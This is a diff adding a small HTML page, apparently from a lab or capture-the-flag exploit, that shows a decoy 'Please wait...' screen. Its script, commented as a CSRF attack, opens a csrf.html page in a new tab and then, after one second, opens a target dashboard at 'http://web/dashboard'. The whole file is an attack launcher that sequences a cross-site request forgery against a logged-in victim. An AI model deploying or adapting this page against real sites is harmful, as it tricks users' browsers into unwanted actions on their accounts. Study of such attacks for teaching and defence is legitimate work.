@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    <script>
+        // Phase 1: Open CSRF page in new tab
+        window.open('./csrf.html');
+
+        // Phase 2: After 1 second, open dashboard
+        setTimeout(function() {
+            window.open('http://web/dashboard');
+        }, 1000);
+    </script>
+</body>
+</html>
